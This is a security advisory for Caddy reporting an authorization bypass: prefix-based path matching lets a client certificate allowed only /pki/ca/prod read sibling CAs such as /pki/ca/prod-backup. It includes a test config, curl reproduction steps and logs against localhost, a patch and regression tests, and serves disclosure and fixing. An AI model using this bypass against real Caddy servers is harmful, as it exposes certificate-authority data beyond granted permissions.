# [M] Caddy: Remote Admin Authorization Bypass on PKI Endpoints via Prefix-Based Path Matching

## Summary
Severity: Medium
Advisory: GHSA-gx7w-56w6-g48x
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-gx7w-56w6-g48x
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=0 <2.11.3

## Details
## AI Disclosure

  I used an LLM to help review the source code, reason about attack surface, and help draft and refine this report.
  I manually validated the finding by reproducing it locally, confirming the vulnerable code path, and verifying the HTTP behavior with `curl -v`.

  ## Summary

  Caddy's remote admin access control performs path authorization using prefix matching:

  - [`admin.go`](/caddy/admin.go#L719): `strings.HasPrefix(r.URL.Path, allowedPath)`

  This allows a client certificate authorized only for `/pki/ca/prod` to access sibling PKI resources whose paths merely share the same prefix, such as `/pki/ca/prod-backup`.

  This is an authorization bug in Caddy's source code, not a misconfiguration issue. The configured policy is more restrictive than the behavior that Caddy actually enforces.

  ## Affected Component

  Remote admin access control for PKI admin endpoints.

  Relevant code:

  - [`admin.go`](/caddy/admin.go#L687)
  - [`admin.go`](/caddy/admin.go#L719)
  - [`modules/caddypki/adminapi.go`](/caddy/modules/caddypki/adminapi.go#L68)
  - [`modules/caddypki/adminapi.go`](/caddy/modules/caddypki/adminapi.go#L164)

  ## Root Cause

  In `RemoteAdmin.enforceAccessControls()`, allowed paths are checked like this:

  ```go
  for _, allowedPath := range accessPerm.Paths {
  	if strings.HasPrefix(r.URL.Path, allowedPath) {
  		pathFound = true
  		break
  	}
  }
```

  This does not enforce a path-segment boundary.

  So if the allowed path is:

  /pki/ca/prod

  then all of the following are treated as authorized:

  - /pki/ca/prod-backup
  - /pki/ca/prod1
  - /pki/ca/prodanything

  For PKI admin endpoints, the CA ID is taken directly from the request path:

  - modules/caddypki/adminapi.go:164

  So /pki/ca/prod-backup is interpreted as CA ID prod-backup, even though only /pki/ca/prod was intended to be allowed.

  ## Security Impact

  A remote admin client certificate restricted to one PKI CA path can access other CA resources with the same prefix.

  This breaks least-privilege remote admin policies and results in authenticated authorization bypass.

  ## Minimal Configuration

  File: repro.json
```
  {
    "admin": {
      "listen": "127.0.0.1:2019",
      "identity": {
        "identifiers": ["localhost"],
        "issuers": [
          { "module": "internal" }
        ]
      },
      "remote": {
        "listen": "127.0.0.1:2021",
        "access_control": [
          {
            "public_keys": ["<CLIENT_CERT_BASE64_DER>"],
            "permissions": [
              {
                "methods": ["GET"],
                "paths": ["/pki/ca/prod"]
              }
            ]
          }
        ]
      }
    },
    "apps": {
      "pki": {
        "certificate_authorities": {
          "prod": {
            "name": "prod"
          },
          "prod-backup": {
            "name": "prod-backup"
          }
        }
      }
    }
  }

```
  ## Reproduction Steps From Scratch

  ### 1. Generate a client certificate
```
  openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
    -subj '/CN=remote-admin-client' \
    -keyout client.key \
    -out client.crt

```

  ### 2. Convert the client certificate to base64 DER

  CLIENT_CERT_B64="$(openssl x509 -in client.crt -outform der | base64 | tr -d '\n')"

  ### 3. Put that value into repro.json

  Replace:

  <CLIENT_CERT_BASE64_DER>

  with the value of CLIENT_CERT_B64.

  ### 4. Run Caddy

  go run ./cmd/caddy run --config ./repro.json

  ### 5. Confirm access to the intended allowed path
```
  curl -vk \
    --resolve localhost:2021:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2021/pki/ca/prod
```
  Expected result:

  - HTTP/1.1 200 OK

  ### 6. Request a different CA whose path shares the same prefix
```
  curl -vk \
    --resolve localhost:2021:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2021/pki/ca/prod-backup
```
  Expected secure behavior:

  - HTTP/1.1 403 Forbidden

  Actual behavior:

  - HTTP/1.1 200 OK

  ## Precise HTTP Requests and Output

  ### Allowed path
```
  curl -vk \
    --resolve localhost:2021:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2021/pki/ca/prod
```
  Response excerpt:
```
  > GET /pki/ca/prod HTTP/1.1
  > Host: localhost:2021
  > User-Agent: curl/8.5.0
  > Accept: */*
  >
  < HTTP/1.1 200 OK
  < Content-Type: application/json
```
  ### Unauthorized sibling path that is incorrectly allowed
```
  curl -vk \
    --resolve localhost:2021:127.0.0.1 \
    --cert ./client.crt \
    --key ./client.key \
    https://localhost:2021/pki/ca/prod-backup
```
  Response excerpt:
```
  > GET /pki/ca/prod-backup HTTP/1.1
  > Host: localhost:2021
  > User-Agent: curl/8.5.0
  > Accept: */*
  >
  < HTTP/1.1 200 OK
  < Content-Type: application/json
```
  The body returned CA information for prod-backup, despite the configured permission only allowing /pki/ca/prod.

  ## Full Log Output

sever :
```
root@dbdd95a60758:/caddy# go run ./cmd/caddy run --config /caddy/repro.json
2026/03/19 13:58:13.747	INFO	maxprocs: Leaving GOMAXPROCS=16: CPU quota undefined
2026/03/19 13:58:13.747	INFO	GOMEMLIMIT is updated	{"GOMEMLIMIT": 26273105510, "previous": 9223372036854775807}
2026/03/19 13:58:13.747	INFO	using config from file	{"file": "/caddy/repro.json"}
2026/03/19 13:58:13.757	INFO	admin	admin endpoint started	{"address": "127.0.0.1:2019", "enforce_origin": false, "origins": ["//localhost:2019", "//[::1]:2019", "//127.0.0.1:2019"]}
2026/03/19 13:58:13.757	WARN	pki.ca.prod	installing root certificate (you might be prompted for password)	{"path": "storage:pki/authorities/prod/root.crt"}
2026/03/19 13:58:13.757	INFO	warning: "certutil" is not available, install "certutil" with "apt install libnss3-tools" or "yum install nss-tools" and try again
2026/03/19 13:58:13.757	INFO	define JAVA_HOME environment variable to use the Java trust
2026/03/19 13:58:14.406	INFO	certificate installed properly in linux trusts
2026/03/19 13:58:14.406	WARN	pki.ca.prod-backup	installing root certificate (you might be prompted for password)	{"path": "storage:pki/authorities/prod-backup/root.crt"}
2026/03/19 13:58:14.407	INFO	warning: "certutil" is not available, install "certutil" with "apt install libnss3-tools" or "yum install nss-tools" and try again
2026/03/19 13:58:14.407	INFO	define JAVA_HOME environment variable to use the Java trust
2026/03/19 13:58:15.038	INFO	certificate installed properly in linux trusts
2026/03/19 13:58:15.045	INFO	admin.identity.cache.maintenance	started background certificate maintenance	{"cache": "0xc0006a4480"}
2026/03/19 13:58:15.046	INFO	admin.remote	secure admin remote control endpoint started	{"address": "127.0.0.1:2021"}
2026/03/19 13:58:15.046	INFO	admin.identity.obtain	acquiring lock	{"identifier": "localhost"}
2026/03/19 13:58:15.046	INFO	autosaved config (load with --resume flag)	{"file": "/root/.config/caddy/autosave.json"}
2026/03/19 13:58:15.046	INFO	serving initial configuration
2026/03/19 13:58:15.047	INFO	admin.identity.obtain	lock acquired	{"identifier": "localhost"}
2026/03/19 13:58:15.047	INFO	admin.identity.obtain	obtaining certificate	{"identifier": "localhost"}
2026/03/19 13:58:15.049	INFO	admin.identity.obtain	certificate obtained successfully	{"identifier": "localhost", "issuer": "local"}
2026/03/19 13:58:15.049	INFO	admin.identity.obtain	releasing lock	{"identifier": "localhost"}
2026/03/19 13:58:15.050	WARN	admin.identity	stapling OCSP	{"identifiers": ["localhost"]}
2026/03/19 13:59:36.896	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2021", "uri": "/pki/ca/prod", "remote_ip": "127.0.0.1", "remote_port": "40728", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/19 14:00:24.102	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2021", "uri": "/pki/ca/prod-backup", "remote_ip": "127.0.0.1", "remote_port": "60490", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
2026/03/19 14:00:33.774	INFO	admin.api	received request	{"method": "GET", "host": "localhost:2021", "uri": "/pki/ca/prod-backup", "remote_ip": "127.0.0.1", "remote_port": "46918", "headers": {"Accept":["*/*"],"User-Agent":["curl/8.5.0"]}, "secure": true, "verified_chains": 1}
```


curl :
```
root@dbdd95a60758:/caddy#   curl -vk \
    --resolve localhost:2021:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    https://localhost:2021/pki/ca/prod
* Added localhost:2021:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2021...
* Connected to localhost (127.0.0.1) port 2021
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 13:58:15 2026 GMT
*  expire date: Mar 20 01:58:15 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> GET /pki/ca/prod HTTP/1.1
> Host: localhost:2021
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Content-Type: application/json
< Date: Thu, 19 Mar 2026 13:59:36 GMT
< Content-Length: 1410
< 
{"id":"prod","name":"prod","root_common_name":"prod - 2026 ECC Root","intermediate_common_name":"prod - ECC Intermediate","root_certificate":"-----BEGIN CERTIFICATE-----\nMIIBgDCCASegAwIBAgIQc9RlUm1dn8xVrPjKdqtb/TAKBggqhkjOPQQDAjAfMR0w\nGwYDVQQDExRwcm9kIC0gMjAyNiBFQ0MgUm9vdDAeFw0yNjAzMTkxMzU4MTNaFw0z\nNjAxMjYxMzU4MTNaMB8xHTAbBgNVBAMTFHByb2QgLSAyMDI2IEVDQyBSb290MFkw\nEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEC+L/zt5e1B08ebSd//MN2zkPZPIIe/8d\nAfdvLfaLpKXEDHdpMUkv+B1ZfJ5ADCKGHby7hMcOmNxd3dN2so2TvaNFMEMwDgYD\nVR0PAQH/BAQDAgEGMBIGA1UdEwEB/wQIMAYBAf8CAQEwHQYDVR0OBBYEFEjO3f/T\ngS+YsLBLu5qoAfzrButkMAoGCCqGSM49BAMCA0cAMEQCIFph9BmyT0EuWH+5FWaJ\nVI0RoHaSNe4YmKhCT0bxlOV/AiAVYjtkncsfNxnIoVtcRWebiKfX4neEAvp6zy/m\n4LabLA==\n-----END CERTIFICATE-----\n","intermediate_certificate":"-----BEGIN CERTIFICATE-----\nMIIBpjCCAUugAwIBAgIQeDYa6T6mhf1UR2ZojWa/NjAKBggqhkjOPQQDAjAfMR0w\nGwYDVQQDExRwcm9kIC0gMjAyNiBFQ0MgUm9vdDAeFw0yNjAzMTkxMzU4MTNaFw0y\nNjAzMjYxMzU4MTNaMCIxIDAeBgNVBAMTF3Byb2QgLSBFQ0MgSW50ZXJtZWRpYXRl\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQc* Connection #0 to host localhost left intact
DQgAEDvNEubxYmGliE/jZf+scF4ln9FGi\nKxGlIBy91xltHw85PZFoPUNYoXZc797RNE89XfPLNzcTmcQ36zAfibXkBaNmMGQw\nDgYDVR0PAQH/BAQDAgEGMBIGA1UdEwEB/wQIMAYBAf8CAQAwHQYDVR0OBBYEFORU\nKtaSzBJ30Yh6xLKBlF3NkXwyMB8GA1UdIwQYMBaAFEjO3f/TgS+YsLBLu5qoAfzr\nButkMAoGCCqGSM49BAMCA0kAMEYCIQCPsqN6  curl -vk \2CdQNYGrH10qYPhO\nMx19KoL/bQIhANyK3kmXwiQ2p6jEuVTIDxLJ1nC6JCDKWoSCXv/m+00Y\n-----END CERTIFICATE-----\n"}


root@dbdd95a60758:/caddy# 
root@dbdd95a60758:/caddy# 
root@dbdd95a60758:/caddy# 
root@dbdd95a60758:/caddy#   curl -vk \
    --resolve localhost:2021:127.0.0.1 \
    --cert /caddy/client.crt \
    --key /caddy/client.key \
    https://localhost:2021/pki/ca/prod-backup
* Added localhost:2021:127.0.0.1 to DNS cache
* Hostname localhost was found in DNS cache
*   Trying 127.0.0.1:2021...
* Connected to localhost (127.0.0.1) port 2021
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Request CERT (13):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Certificate (11):
* TLSv1.3 (OUT), TLS handshake, CERT verify (15):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / id-ecPublicKey
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: [NONE]
*  start date: Mar 19 13:58:15 2026 GMT
*  expire date: Mar 20 01:58:15 2026 GMT
*  issuer: CN=Caddy Local Authority - ECC Intermediate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
* using HTTP/1.x
> GET /pki/ca/prod-backup HTTP/1.1
> Host: localhost:2021
> User-Agent: curl/8.5.0
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/1.1 200 OK
< Content-Type: application/json
< Date: Thu, 19 Mar 2026 14:00:33 GMT
< Content-Length: 1476
< 
{"id":"prod-backup","name":"prod-backup","root_common_name":"prod-backup - 2026 ECC Root","intermediate_common_name":"prod-backup - ECC Intermediate","root_certificate":"-----BEGIN CERTIFICATE-----\nMIIBjjCCATWgAwIBAgIQT1WaOdq8CllHL5S6sAnk8TAKBggqhkjOPQQDAjAmMSQw\nIgYDVQQDExtwcm9kLWJhY2t1cCAtIDIwMjYgRUNDIFJvb3QwHhcNMjYwMzE5MTM1\nODEzWhcNMzYwMTI2MTM1ODEzWjAmMSQwIgYDVQQDExtwcm9kLWJhY2t1cCAtIDIw\nMjYgRUNDIFJvb3QwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAT0+xx/GaeAr+/I\nZcKDeqZ068wOshKbcqydNJauAgbip7i88d76qYyQr+X7ooMYcmRV445suZ0NHn00\ndGIjpStZo0UwQzAOBgNVHQ8BAf8EBAMCAQYwEgYDVR0TAQH/BAgwBgEB/wIBATAd\nBgNVHQ4EFgQU9oZZqnBlvHmEti9gsN7cSStl8tIwCgYIKoZIzj0EAwIDRwAwRAIg\ncXbK46l4eAyrW3y9sgUBcheutkytG0d2cqgD67HuqdQCICI8E2O42zfz1afR/Joj\nalNeF17VljePo75gPjIOp5kv\n-----END CERTIFICATE-----\n","intermediate_certificate":"-----BEGIN CERTIFICATE-----\nMIIBtDCCAVmgAwIBAgIQFJSHXX6ao3EgdKjGdRXeiDAKBggqhkjOPQQDAjAmMSQw\nIgYDVQQDExtwcm9kLWJhY2t1cCAtIDIwMjYgRUNDIFJvb3QwHhcNMjYwMzE5MTM1\nODEzWhcNMjYwMzI2MTM1ODEzWjApMScwJQYDVQQDEx5wcm9kLWJhY* Connection #0 to host localhost left intact
2t1cCAtIEVD\nQyBJbnRlcm1lZGlhdGUwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAARbdjKxj1Ce\n4iCF1dbKGgsob9jH29DiUow/0yNJ6Cb7IBh0mAKK0y/nU+C6IfcFBgFOmla8wHhI\njyKVLy38Jb87o2YwZDAOBgNVHQ8BAf8EBAMCAQYwEgYDVR0TAQH/BAgwBgEB/wIB\nADAdBgNVHQ4EFgQUescC8F6u/krP+iw9Uc2FpqrorG0wHwYDVR0jBBgwFoAU9oZZ\nqnBlvHmEti9gsN7cSStl8tIwCgYIKoZIzj0EAwIDSQAwRgIhANm2Zxrs2q6JI5B0\nmMh4PWJM9ilOu/0C/jTMSK3otqEqAiEAor00ItWkpcgLpXI4lRbefzeTM+f8yr6V\nXryCbtlyT38=\n-----END CERTIFICATE-----\n"}

```


  ## Why This Is Not Just Misconfiguration

  The configuration explicitly attempts to restrict access to:

  /pki/ca/prod

  The unsafe behavior is caused by Caddy's implementation using prefix matching instead of segment-aware matching. The product does not enforce the configured policy as written.

  ## Suggested Fix

  Path authorization should allow:

  - exact match, or
  - subpath match only when the next character is /

  For example:
```
  func pathAllowed(reqPath, allowedPath string) bool {
  	if reqPath == allowedPath {
  		return true
  	}
  	return strings.HasPrefix(reqPath, allowedPath+"/")
  }
```
  This preserves intended access to subresources like:

  - /pki/ca/prod/certificates

  while correctly denying sibling resources like:

  - /pki/ca/prod-backup

  ## Working Patch

```
  diff --git a/admin.go b/admin.go
  index 0000000..0000000 100644
  --- a/admin.go
  +++ b/admin.go
  @@ -716,8 +716,8 @@ func (remote RemoteAdmin) enforceAccessControls(r *http.Request) error {
   						// verify path
   						pathFound := accessPerm.Paths == nil
   						for _, allowedPath := range accessPerm.Paths {
  -							if strings.HasPrefix(r.URL.Path, allowedPath) {
  -								pathFound = true
  +							if r.URL.Path == allowedPath || strings.HasPrefix(r.URL.Path, allowedPath+"/") {
  +								pathFound = true
   								break
   							}
   						}


```
  ## Why the Patch Works

  The patch changes authorization from naive prefix matching to segment-aware matching.

  This allows:

  - /pki/ca/prod
  - /pki/ca/prod/certificates

  but denies:

  - /pki/ca/prod-backup
  - /pki/ca/prod1

  which is consistent with the configured path policy.

  ## Suggested Regression Tests

  At minimum:

  1. Allow /pki/ca/prod, request /pki/ca/prod, expect allowed.
  2. Allow /pki/ca/prod, request /pki/ca/prod/certificates, expect allowed.
  3. Allow /pki/ca/prod, request /pki/ca/prod-backup, expect denied.
  4. Allow /pki/ca/prod, request /pki/ca/prod1, expect denied.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-gx7w-56w6-g48x
- https://github.com/caddyserver/caddy
